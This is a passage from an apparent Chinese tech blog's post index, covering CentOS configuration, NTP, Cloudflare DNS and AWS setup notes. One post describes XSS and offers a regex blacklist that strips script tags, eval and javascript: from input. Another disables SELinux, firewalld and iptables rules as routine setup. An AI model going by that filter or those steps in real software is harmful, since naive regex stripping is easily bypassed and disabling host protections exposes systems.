<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ timedatectl status</span><br><span class="line">      Local time: Mon 2019-11-25 16:20:29 CST</span><br><span class="line">  Universal time: Mon 2019-11-25 08:20:29 UTC</span><br><span class="line">        RTC time: Mon 2019-11-25 08:20:29</span><br><span class="line">       Time zone: Asia/Taipei (CST, +0800)</span><br><span class="line">     NTP enabled: <span class="built_in">yes</span></span><br><span class="line">NTP synchronized: <span class="built_in">yes</span></span><br><span class="line"> RTC <span class="keyword">in</span> <span class="built_in">local</span> TZ: no</span><br><span class="line">      DST active: n/a</span><br></pre></td></tr></table></figure>

<p>先找出TimeZone&#x2F;Asia設定</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ timedatectl list-timezones | grep Asia</span><br><span class="line">Asia/Aden</span><br><span class="line">Asia/Almaty</span><br><span class="line">Asia/Amman</span><br><span class="line">Asia/Anadyr</span><br><span class="line">Asia/Aqtau</span><br><span class="line">Asia/Aqtobe</span><br><span class="line">Asia/Ashgabat</span><br><span class="line">Asia/Baghdad</span><br><span class="line">Asia/Bahrain</span><br><span class="line">Asia/Baku</span><br><span class="line">Asia/Bangkok</span><br><span class="line">Asia/Barnaul</span><br><span class="line">Asia/Beirut</span><br><span class="line">Asia/Bishkek</span><br><span class="line">Asia/Brunei</span><br><span class="line">Asia/Chita</span><br><span class="line">Asia/Choibalsan</span><br><span class="line">Asia/Colombo</span><br><span class="line">Asia/Damascus</span><br><span class="line">Asia/Dhaka</span><br><span class="line">Asia/Dili</span><br><span class="line">Asia/Dubai</span><br><span class="line">Asia/Dushanbe</span><br><span class="line">Asia/Gaza</span><br><span class="line">Asia/Hebron</span><br><span class="line">Asia/Ho_Chi_Minh</span><br><span class="line">Asia/Hong_Kong</span><br><span class="line">Asia/Hovd</span><br><span class="line">Asia/Irkutsk</span><br><span class="line">Asia/Jakarta</span><br><span class="line">Asia/Jayapura</span><br><span class="line">Asia/Jerusalem</span><br><span class="line">Asia/Kabul</span><br><span class="line">Asia/Kamchatka</span><br><span class="line">Asia/Karachi</span><br><span class="line">Asia/Kathmandu</span><br><span class="line">Asia/Khandyga</span><br><span class="line">Asia/Kolkata</span><br><span class="line">Asia/Krasnoyarsk</span><br><span class="line">Asia/Kuala_Lumpur</span><br><span class="line">Asia/Kuching</span><br><span class="line">Asia/Kuwait</span><br><span class="line">Asia/Macau</span><br><span class="line">Asia/Magadan</span><br><span class="line">Asia/Makassar</span><br><span class="line">Asia/Manila</span><br><span class="line">Asia/Muscat</span><br><span class="line">Asia/Nicosia</span><br><span class="line">Asia/Novokuznetsk</span><br><span class="line">Asia/Novosibirsk</span><br><span class="line">Asia/Omsk</span><br><span class="line">Asia/Oral</span><br><span class="line">Asia/Phnom_Penh</span><br><span class="line">Asia/Pontianak</span><br><span class="line">Asia/Pyongyang</span><br><span class="line">Asia/Qatar</span><br><span class="line">Asia/Qyzylorda</span><br><span class="line">Asia/Riyadh</span><br><span class="line">Asia/Sakhalin</span><br><span class="line">Asia/Samarkand</span><br><span class="line">Asia/Seoul</span><br><span class="line">Asia/Shanghai</span><br><span class="line">Asia/Singapore</span><br><span class="line">Asia/Srednekolymsk</span><br><span class="line">Asia/Taipei</span><br><span class="line">Asia/Tashkent</span><br><span class="line">Asia/Tbilisi</span><br><span class="line">Asia/Tehran</span><br><span class="line">Asia/Thimphu</span><br><span class="line">Asia/Tokyo</span><br><span class="line">Asia/Tomsk</span><br><span class="line">Asia/Ulaanbaatar</span><br><span class="line">Asia/Urumqi</span><br><span class="line">Asia/Ust-Nera</span><br><span class="line">Asia/Vientiane</span><br><span class="line">Asia/Vladivostok</span><br><span class="line">Asia/Yakutsk</span><br><span class="line">Asia/Yangon</span><br><span class="line">Asia/Yekaterinburg</span><br><span class="line">Asia/Yerevan</span><br></pre></td></tr></table></figure>

<p>下指令改變TimeZone Asia&#x2F;Taipei</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ timedatectl set-timezone Asia/Taipei</span><br></pre></td></tr></table></figure>

<p>查詢目前時區可用date</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">date</span></span><br><span class="line">Mon Nov 25 16:23:26 CST 2019</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CentOS7</category>
      </categories>
      <tags>
        <tag>CentOS7</tag>
        <tag>TimeZone</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7設定NTP對時</title>
    <url>/posts/a7ed551f/</url>
    <content><![CDATA[<h3 id="CentOS7設定NTP對時"><a href="#CentOS7設定NTP對時" class="headerlink" title="CentOS7設定NTP對時"></a>CentOS7設定NTP對時</h3><span id="more"></span>
<h2 id="有兩種設定方式第一種-可以加入ntpdate到root-crontab即可"><a href="#有兩種設定方式第一種-可以加入ntpdate到root-crontab即可" class="headerlink" title="有兩種設定方式第一種:可以加入ntpdate到root crontab即可"></a>有兩種設定方式<br>第一種:<br>可以加入ntpdate到root crontab即可<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0 * * * * /usr/sbin/ntpdate time.stdtime.gov.tw &amp;&amp; /sbin/hwclock -w</span><br></pre></td></tr></table></figure></h2><p>第二種<br>Step1:在Terminal 用date指令確認時間是否正確</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@bacintra ~]<span class="comment"># date</span></span><br><span class="line">Fri Aug 10 14:14:31 CST 2018</span><br></pre></td></tr></table></figure>
<p>Step2:安裝NTP套件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo yum -y install ntp</span><br></pre></td></tr></table></figure>
<p>Step3:啟動 ntpd daemon</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@bacintra ~]<span class="comment"># systemctl start ntpd</span></span><br><span class="line">[root@bacintra ~]<span class="comment"># systemctl status ntpd</span></span><br><span class="line">● ntpd.service - Network Time Service</span><br><span class="line">Loaded: loaded (/usr/lib/systemd/system/ntpd.service; disabled; vendor preset: disabled)</span><br><span class="line">Active: active (running) since Fri 2018-08-10 14:11:12 CST; 8s ago</span><br><span class="line">Process: 1266 ExecStart=/usr/sbin/ntpd -u ntp:ntp <span class="variable">$OPTIONS</span> (code=exited, status=0/SUCCESS)</span><br><span class="line">Main PID: 1267 (ntpd)</span><br><span class="line">CGroup: /system.slice/ntpd.service</span><br><span class="line">└─1267 /usr/sbin/ntpd -u ntp:ntp -g</span><br><span class="line"></span><br><span class="line">Aug 10 14:11:12 bacintra ntpd[1267]: Listen normally on 2 lo 127.0.0.1 UDP 123</span><br><span class="line">Aug 10 14:11:12 bacintra ntpd[1267]: Listen normally on 3 enp2s0 10.10.10.103 UDP 123</span><br><span class="line">Aug 10 14:11:12 bacintra ntpd[1267]: Listen normally on 4 virbr0 172.16.122.1 UDP 123</span><br><span class="line">Aug 10 14:11:12 bacintra ntpd[1267]: Listen normally on 5 lo ::1 UDP 123</span><br><span class="line">Aug 10 14:11:12 bacintra ntpd[1267]: Listen normally on 6 enp2s0 fe80::4a5b:39ff:fe05:231c UDP 123</span><br><span class="line">Aug 10 14:11:12 bacintra ntpd[1267]: Listening on routing socket on fd <span class="comment">#23 for interface updates</span></span><br><span class="line">Aug 10 14:11:13 bacintra ntpd[1267]: 0.0.0.0 c016 06 restart</span><br><span class="line">Aug 10 14:11:13 bacintra ntpd[1267]: 0.0.0.0 c012 02 freq_set kernel 0.000 PPM</span><br><span class="line">Aug 10 14:11:13 bacintra ntpd[1267]: 0.0.0.0 c011 01 freq_not_set</span><br><span class="line">Aug 10 14:11:13 bacintra ntpd[1267]: 0.0.0.0 c614 04 freq_mode</span><br></pre></td></tr></table></figure>
<p>Step4:讓系統在開機時自動啟用 ntpd daemon</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@bacintra ~]<span class="comment"># systemctl is-enabled ntpd</span></span><br><span class="line">disabled</span><br><span class="line">[root@bacintra ~]<span class="comment"># systemctl enable ntpd</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/ntpd.service to /usr/lib/systemd/system/ntpd.service.</span><br><span class="line">[root@bacintra ~]<span class="comment"># systemctl is-enabled ntpd</span></span><br><span class="line">enabled</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CentOS7</category>
      </categories>
      <tags>
        <tag>CentOS7</tag>
        <tag>NTP</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS設定hostname</title>
    <url>/posts/bb2ad9e2/</url>
    <content><![CDATA[<h3 id="CentOS設定hostname"><a href="#CentOS設定hostname" class="headerlink" title="CentOS設定hostname"></a>CentOS設定hostname</h3><span id="more"></span>
<p>先查看CentOS上目前hostname</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$  hostnamectl</span><br><span class="line">   Static hostname: localhost.localdomain</span><br><span class="line">         Icon name: computer-desktop</span><br><span class="line">           Chassis: desktop</span><br><span class="line">        Machine ID: f08e0bfd24b54a2aa240419122e4f8be</span><br><span class="line">           Boot ID: 8fe1951afafb40779243d362a020caab</span><br><span class="line">  Operating System: CentOS Linux 7 (Core)</span><br><span class="line">       CPE OS Name: cpe:/o:centos:centos:7</span><br><span class="line">            Kernel: Linux 3.10.0-957.el7.x86_64</span><br><span class="line">      Architecture: x86-64</span><br></pre></td></tr></table></figure>

<p>設定hostname</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname [NAME]</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CentOS7</category>
      </categories>
      <tags>
        <tag>CentOS7</tag>
        <tag>hostname</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7設定解析度</title>
    <url>/posts/cedbdcf4/</url>
    <content><![CDATA[<h3 id="CentOS7設定解析度"><a href="#CentOS7設定解析度" class="headerlink" title="CentOS7設定解析度"></a>CentOS7設定解析度</h3><span id="more"></span>
<p>Step1:先開啟Terminal</p>
<p>Step2:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># xrandr</span></span><br><span class="line"></span><br><span class="line">Screen 0: minimum 320 x 200, current 1920 x 1600, maximum 16384 x 16384</span><br><span class="line">DVI-I-1 connected primary 1920x1600+0+0 (normal left inverted right x axis y axis) 477mm x 268mm</span><br><span class="line">1920x1080 60.00 +</span><br><span class="line">1600x1200 60.00</span><br><span class="line">1680x1050 59.88</span><br><span class="line">1280x1024 75.02 60.02</span><br><span class="line">1440x900 59.90</span><br><span class="line">1280x960 60.00</span><br><span class="line">1280x800 74.93 59.91</span><br><span class="line">1152x864 75.00</span><br><span class="line">1024x768 75.03 70.07 60.00</span><br><span class="line">832x624 74.55</span><br><span class="line">800x600 72.19 75.00 60.32 56.25</span><br><span class="line">640x480 75.00 72.81 66.67 59.94</span><br><span class="line">720x400 70.08</span><br><span class="line">1900x1200 60.00</span><br><span class="line">1920x1600 60.00*</span><br><span class="line">HDMI-1 disconnected (normal left inverted right x axis y axis)</span><br><span class="line">VGA-1 disconnected (normal left inverted right x axis y axis)</span><br><span class="line"></span><br><span class="line">PS:看是DVI-I-1 或 HDMI-1 或 VGA-1 哪一種介面 connected</span><br></pre></td></tr></table></figure>
<p>Step3:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># gtf 1920 1600 60 -x</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1920x1600 @ 60.00 Hz (GTF) hsync: 99.36 kHz; pclk: 260.72 MHz</span></span><br><span class="line">Modeline <span class="string">&quot;1920x1600_60.00&quot;</span> 260.72 1920 2064 2272 2624 1600 1601 1604 1656 -HSync +Vsync</span><br></pre></td></tr></table></figure>
<p>Step4:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># xrandr --newmode &quot;1920x1600&quot; 260.72 1920 2064 2272 2624 1600 1601 1604 1656 -HSync +Vsync</span></span><br><span class="line"></span><br><span class="line">PS:newmode 後面必須要接 Modeline 後面的參數</span><br></pre></td></tr></table></figure>
<p>Step5:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># xrandr --addmode DVI-I-1 1920x1600</span></span><br></pre></td></tr></table></figure>
<p>Step6:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># xrandr --output DVI-I-1 --mode 1920x1600</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CentOS7</category>
      </categories>
      <tags>
        <tag>CentOS7</tag>
        <tag>Resolution</tag>
      </tags>
  </entry>
  <entry>
    <title>CloudFlare Set Domain To GitHub Pages</title>
    <url>/posts/8f28870d/</url>
    <content><![CDATA[<h2 id="CloudFlare-Set-Domain-To-GitHub-Pages"><a href="#CloudFlare-Set-Domain-To-GitHub-Pages" class="headerlink" title="CloudFlare Set Domain To GitHub Pages"></a>CloudFlare Set Domain To GitHub Pages</h2><span id="more"></span>
<p>這篇介紹CloudFlare Set Domain To GitHub Pages。</p>
<h2 id="Step-by-step"><a href="#Step-by-step" class="headerlink" title="Step by step:"></a>Step by step:</h2><p>1.先去購買自己喜歡的domain<br>2.CloudFlare註冊帳號 -&gt; add site -&gt; 填入剛購買的domain<br>3.在domain購買網站輸入 DNS Servers -&gt; 通常有兩組 xxx.ns.cloudflare.com<br>4.這邊需要等待時間讓DNS Server設定生效<br>5.至GitHub Pages 設定 Custom Domain<br>6.$ ping {domain}<br>7.$ dig {domain}<br>6 &amp; 7可確認domain設定是否生效</p>
]]></content>
      <categories>
        <category>CloudFlare</category>
      </categories>
      <tags>
        <tag>CloudFlare</tag>
        <tag>SSL</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>Check CentOS Version And Cpu Core</title>
    <url>/posts/dbc5f142/</url>
    <content><![CDATA[<h3 id="Check-CentOS-Version-And-Cpu-Core"><a href="#Check-CentOS-Version-And-Cpu-Core" class="headerlink" title="Check CentOS Version And Cpu Core"></a>Check CentOS Version And Cpu Core</h3><span id="more"></span>
<p>這篇介紹Check CentOS Version And Cpu Core.</p>
<h3 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a>Instruction</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">查CentOS版本</span><br><span class="line">$ <span class="built_in">cat</span> /etc/redhat-release</span><br><span class="line"></span><br><span class="line">查CPU</span><br><span class="line">$ lscpu</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>Cross-Site-Scripting(XSS) Solution</title>
    <url>/posts/434233c/</url>
    <content><![CDATA[<h3 id="Intro-Cross-Site-Scripting-XSS-Solution"><a href="#Intro-Cross-Site-Scripting-XSS-Solution" class="headerlink" title="Intro Cross-Site-Scripting(XSS) Solution"></a>Intro Cross-Site-Scripting(XSS) Solution</h3><span id="more"></span>
<p>這篇介紹Cross-Site-Scripting(XSS)，它是一個資訊安全滲透測試的issue。</p>
<h3 id="Case-Study"><a href="#Case-Study" class="headerlink" title="Case Study"></a>Case Study</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">XSS是指hacker利用網頁程式的漏洞，將攻擊語法寫入資料庫或注入網頁參數，</span><br><span class="line">使瀏覽器載入該網頁時會一併含有攻擊語法的值帶入回應，導致下載惡意程式</span><br><span class="line">或傳輸使用者機密資訊等資安風險。</span><br></pre></td></tr></table></figure>

<h3 id="攻擊手法"><a href="#攻擊手法" class="headerlink" title="攻擊手法"></a>攻擊手法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.竊取cookie</span><br><span class="line">2.植入Flash</span><br><span class="line">3.用iframe、frame、XMLHttpRequest等方式，以用戶的身分執行管理動作</span><br><span class="line">4.DDos</span><br></pre></td></tr></table></figure>

<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">每個參數檢查非法字元:</span><br><span class="line"></span><br><span class="line">private static final Pattern[] xssPatterns = new Pattern[] &#123;</span><br><span class="line">	// Script fragments</span><br><span class="line">	Pattern.compile(<span class="string">&quot;&amp;lt;script&amp;gt;(.*?)&amp;lt;/script&amp;gt;&quot;</span>, Pattern.CASE_INSENSITIVE),</span><br><span class="line">	Pattern.compile(<span class="string">&quot;&lt;script&gt;(.*?)&lt;/script&gt;&quot;</span>, Pattern.CASE_INSENSITIVE),</span><br><span class="line">	// src=<span class="string">&#x27;...&#x27;</span></span><br><span class="line">	Pattern.compile(<span class="string">&quot;src[\r\n]*=[\r\n]*\\\&#x27;(.*?)\\\&#x27;&quot;</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),</span><br><span class="line">	Pattern.compile(<span class="string">&quot;src[\r\n]*=[\r\n]*\\\&quot;(.*?)\\\&quot;&quot;</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),</span><br><span class="line">	// lonely script tags</span><br><span class="line">	Pattern.compile(<span class="string">&quot;&amp;lt;/script&amp;gt;&quot;</span>, Pattern.CASE_INSENSITIVE),</span><br><span class="line">	Pattern.compile(<span class="string">&quot;&lt;/script&gt;&quot;</span>, Pattern.CASE_INSENSITIVE),</span><br><span class="line">	Pattern.compile(<span class="string">&quot;&amp;lt;script(.*?)&amp;gt;&quot;</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),</span><br><span class="line">	Pattern.compile(<span class="string">&quot;&lt;script(.*?)&gt;&quot;</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),</span><br><span class="line">	// <span class="built_in">eval</span>(...)</span><br><span class="line">	Pattern.compile(<span class="string">&quot;eval\\((.*?)\\)&quot;</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),</span><br><span class="line">	// expression(...)</span><br><span class="line">	Pattern.compile(<span class="string">&quot;expression\\((.*?)\\)&quot;</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),</span><br><span class="line">	// javascript:...</span><br><span class="line">	Pattern.compile(<span class="string">&quot;javascript:&quot;</span>, Pattern.CASE_INSENSITIVE),</span><br><span class="line">	// vbscript:...</span><br><span class="line">	Pattern.compile(<span class="string">&quot;vbscript:&quot;</span>, Pattern.CASE_INSENSITIVE),</span><br><span class="line">	// onload(...)=...</span><br><span class="line">	Pattern.compile(<span class="string">&quot;onload(.*?)=&quot;</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public static String stripXSS(String value) &#123;</span><br><span class="line">	<span class="keyword">if</span> (value != null) &#123;</span><br><span class="line"></span><br><span class="line">		value = value.replaceAll(<span class="string">&quot;\0&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (Pattern scriptPattern : xssPatterns) &#123;</span><br><span class="line">			value = scriptPattern.matcher(value).replaceAll(<span class="string">&quot;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Information Security</category>
      </categories>
      <tags>
        <tag>Information Security</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7關閉SELINUX</title>
    <url>/posts/ea36c705/</url>
    <content><![CDATA[<h3 id="CentOS7關閉SELINUX"><a href="#CentOS7關閉SELINUX" class="headerlink" title="CentOS7關閉SELINUX"></a>CentOS7關閉SELINUX</h3><span id="more"></span>
<p>在 Linux 進行軟體安裝時，幾乎都會關閉 SELinux。<br>SELinux（Security-Enhanced Linux）是為了避免使用者資源的誤用，在進行程序、檔案等細部權限設定依據的一個核心模組！<br>遵從最小權限理念，預設情況下所有程序都是被拒絕的。</p>
<p>SELinux 共有三種模式如下：</p>
<p>Enforcing：強制模式，依據設定來限制檔案資源存取。<br>Permissive：寬容模式，不限制檔案資源存取，但仍會依據設定檢查並記錄相關訊息。<br>Disabled：停用模式，SELinux 已被停用。</p>
<h3 id="使用指令可以查詢目前模式。"><a href="#使用指令可以查詢目前模式。" class="headerlink" title="使用指令可以查詢目前模式。"></a>使用指令可以查詢目前模式。</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ getenforce</span><br></pre></td></tr></table></figure>
<h3 id="使用指令可以檢視-SELinux-詳細狀態。"><a href="#使用指令可以檢視-SELinux-詳細狀態。" class="headerlink" title="使用指令可以檢視 SELinux 詳細狀態。"></a>使用指令可以檢視 SELinux 詳細狀態。</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sestatus</span><br></pre></td></tr></table></figure>
<p>針對SELINUX執行指令如下:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ setenforce 0</span><br><span class="line">$ sed -i <span class="string">&#x27;s/SELINUX=enforcing/SELINUX=disabled/g&#x27;</span> /etc/selinux/config</span><br><span class="line">$ systemctl <span class="built_in">disable</span> firewalld </span><br><span class="line">$ systemctl <span class="built_in">disable</span> NetworkManager</span><br><span class="line">$ yum -y install iptables-utils iptables-services</span><br><span class="line">$ iptables -F</span><br><span class="line">$ iptables -X</span><br><span class="line">$ service iptables save</span><br></pre></td></tr></table></figure>
<p>reference:</p>
<p>★★ 暫時性的關掉或開啟 selinux ★★</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ getenforce</span><br><span class="line">Enforcing</span><br><span class="line">$ sudo setenforce 0</span><br><span class="line">$ getenforce</span><br><span class="line">Permissive</span><br><span class="line">$ sudo setenforce 1</span><br><span class="line">$ getenforce</span><br><span class="line">Enforcing</span><br></pre></td></tr></table></figure>
<p>★★ 永久性的關掉 selinux ★★</p>
<h3 id="使用指令檢視設定檔內容。"><a href="#使用指令檢視設定檔內容。" class="headerlink" title="使用指令檢視設定檔內容。"></a>使用指令檢視設定檔內容。</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo vi /etc/sysconfig/selinux    </span><br></pre></td></tr></table></figure>
<p>找到<br>SELINUX&#x3D;enforcing<br>然後修改為<br>SELINUX&#x3D;disabled<br>要重新開機 reboot &#x2F; restart 後才會套用</p>
]]></content>
      <categories>
        <category>CentOS7</category>
      </categories>
      <tags>
        <tag>CentOS7</tag>
        <tag>SELINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>Create An AWS Account Step By Step</title>
    <url>/posts/4c3725cb/</url>
    <content><![CDATA[<h2 id="Create-An-AWS-Account-Step-By-Step"><a href="#Create-An-AWS-Account-Step-By-Step" class="headerlink" title="Create An AWS Account Step By Step"></a>Create An AWS Account Step By Step</h2><span id="more"></span>
<p>這篇介紹Create An AWS Account Step By Step.</p>
<h2 id="Step-By-Step"><a href="#Step-By-Step" class="headerlink" title="Step By Step"></a>Step By Step</h2><h2 id="Stage-1-Sign-up-for-an-account"><a href="#Stage-1-Sign-up-for-an-account" class="headerlink" title="Stage 1 - Sign up for an account"></a>Stage 1 - Sign up for an account</h2><ol>
<li><p>Visit the Amazon Web Services home page.</p>
</li>
<li><p>Choose Create an AWS Account.<br>Note: If you signed in to AWS recently, choose Sign in to the Console.<br>If Create a new AWS account isn’t visible, first choose Sign in to a<br>different account, and then choose Create a new AWS account.</p>
</li>
<li><p>Enter your account information, and then choose Continue.<br>Be sure that you enter your account information correctly, especially<br>your email address. If you enter your email address incorrectly,<br>you can’t access your account.</p>
</li>
<li><p>Choose Personal or Professional.<br>Note: These two account types are identical in functionality.<br>You can choose a personal account for your personal projects or choose<br>professional for use within your company, an educational institution,<br>or an organization.</p>
</li>
<li><p>Enter your company or personal information.</p>
</li>
<li><p>Read the AWS Customer Agreement, and then check the box.</p>
</li>
<li><p>Click Create Account and Continue.</p>
</li>
</ol>
<h2 id="Stage-2-Add-a-payment-method"><a href="#Stage-2-Add-a-payment-method" class="headerlink" title="Stage 2 - Add a payment method"></a>Stage 2 - Add a payment method</h2><ol>
<li>On the Payment Information page, add a payment method by typing<br>the requested information associated with your payment method.</li>
<li>Choose Verify and Add.<br>Important: You can’t proceed with the sign-up process until you add a<br>valid payment method.</li>
</ol>
<h2 id="Stage-3-Verify-your-identity"><a href="#Stage-3-Verify-your-identity" class="headerlink" title="Stage 3 - Verify your identity"></a>Stage 3 - Verify your identity</h2><ol>
<li>On the Identity Verification page. Choose your country or region<br>code from the list.</li>
<li>Enter a phone number where you can be reached in the next few minutes.</li>
<li>Enter the code displayed in the CAPTCHA.</li>
<li>When you’re ready to receive a call or text message (sms). Choose<br>Contact me&#x2F;Send SMS. In a few moments you should be contacted via the<br>verification system. </li>
<li>Enter the verification code you receive and choose Verify Code.</li>
<li>Choose Continue.</li>
</ol>
<h2 id="Stage-4-Choose-an-AWS-Support-plan"><a href="#Stage-4-Choose-an-AWS-Support-plan" class="headerlink" title="Stage 4 - Choose an AWS Support plan"></a>Stage 4 - Choose an AWS Support plan</h2><ol>
<li>On the Select a Support Plan page, select the Basic Plan<br>included in the free tier.</li>
<li>Click Sign in to Console to sign in to your console.</li>
</ol>
<h2 id="Stage-5-Set-up-free-tier-alert-and-custom-billing-alert"><a href="#Stage-5-Set-up-free-tier-alert-and-custom-billing-alert" class="headerlink" title="Stage 5 - Set up free tier alert and custom billing alert"></a>Stage 5 - Set up free tier alert and custom billing alert</h2><ol>
<li>Search for Billing in the search bar and select it.</li>
<li>In the left hand navigation bar select Billing preferences</li>
<li>Under the Cost Management Preferences section, select the check<br>boxes for Receive Free Tier Usage Alerts and Receive Billing Alerts.</li>
<li>Enter your email address into the text input box under Receive<br>Free Tier Usage Alerts.</li>
<li>Select Save preferences.</li>
<li>In the services search bar, type in CloudWatch and select it. </li>
<li>If necessary, change the Region in the upper right corner to<br>US East (N. Virginia). Billing metric data is stored in this Region<br>and represents worldwide charges.</li>
<li>In the navigation pane, choose Alarms, then click Create Alarm.</li>
<li>Choose Select metric. In the search bar under Metrics, type in<br>Billing, then choose Billing &gt;Total Estimated Charge. If you don’t<br>see Billing or the Total Estimated Charge metric, you may need to<br>go back a few steps to enable billing alerts from the Billing<br>preferences page.</li>
<li>Select the check box next to EstimatedCharges, and choose<br>Select metric.</li>
<li>Under Conditions, choose Static.</li>
<li>For Whenever EstimatedCharges is, choose Greater.</li>
<li>For than, enter the monthly amount (this should be whatever<br>number you are comfortable with. For example, 10) that must be<br>exceeded to trigger the alarm. Choose Next.</li>
<li>In the Notification box, for Alarm State Trigger, select In<br>alarm. Under Select an SNS Topic, choose create a new topic to be<br>notified.</li>
</ol>
<p>Amazon Simple Notification Service (Amazon SNS) is a service that<br>publishes messages to a topic which delivers the message to all topic<br>subscribers.</p>
<ol start="14">
<li><p>Enter a topic name. The name must be unique. Then, type<br>in your email to receive the notification.<br>NOTE: You will get an email in your inbox asking you to confirm your<br>subscription to this topic. By confirming, you’re ensuring that you<br>will get notifications when your estimated billing charges rises<br>above your threshold.Click Create Topic. Then, select Next.</p>
</li>
<li><p>Enter in an alarm name and description. The name must contain<br>only ASCII characters. </p>
</li>
<li><p>Under Preview and create, confirm that the information and<br>conditions are what you want, then choose Create alarm.</p>
</li>
</ol>
]]></content>
      <categories>
        <category>AWS</category>
      </categories>
      <tags>
        <tag>AWS</tag>
      </tags>
  </entry>
  <entry>
    <title>Curl Url Generate To File Example</title>
    <url>/posts/d1a04a6a/</url>
    <content><![CDATA[<h3 id="Curl-Url-Generate-To-File-Example"><a href="#Curl-Url-Generate-To-File-Example" class="headerlink" title="Curl Url Generate To File Example"></a>Curl Url Generate To File Example</h3><span id="more"></span>
<p>這篇介紹透過Curl Url來產生檔案。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-o filename        <span class="comment">#將curl返回的請求結果，寫入到filename檔案中</span></span><br><span class="line"></span><br><span class="line">$ curl http://127.0.0.1/query/getData -o Data.json</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>curl</category>
      </categories>
      <tags>
        <tag>curl</tag>
      </tags>
  </entry>
  <entry>
    <title>Developing On AWS Memo III</title>
    <url>/posts/a261fb6a/</url>
    <content><![CDATA[<h3 id="Developing-On-AWS-Memo-III"><a href="#Developing-On-AWS-Memo-III" class="headerlink" title="Developing On AWS Memo III"></a>Developing On AWS Memo III</h3><span id="more"></span>
<p>這篇紀錄Developing On AWS Memo III。</p>
<h3 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Monolith 單體</span><br><span class="line"></span><br><span class="line">Side effect</span><br><span class="line"></span><br><span class="line">Microservice 顆粒度要切到多細？</span><br><span class="line"></span><br><span class="line">組織的架構決定系統的邊界</span><br><span class="line"></span><br><span class="line">Domain-driven design 每一個功能都需要從Domain切入</span><br><span class="line"></span><br><span class="line">Service &lt;—— API ——&gt; Service</span><br><span class="line"></span><br><span class="line">Startup初期 不適合使用DDD cause 沒有完整人員配置(很花時間) + Domain通常會快速變化</span><br><span class="line"></span><br><span class="line">Strangler 扼殺者</span><br><span class="line"></span><br><span class="line">Anti-corrpt layer 避免交易失敗 會導回原本的服務 不適合用在state <span class="keyword">function</span></span><br><span class="line"></span><br><span class="line">Facade pattern</span><br><span class="line"></span><br><span class="line">Strangler design pattern -&gt; Refactor</span><br><span class="line"></span><br><span class="line">Step <span class="keyword">function</span> by AWS many <span class="built_in">functions</span></span><br><span class="line"></span><br><span class="line">Why need Amazon Cognito? 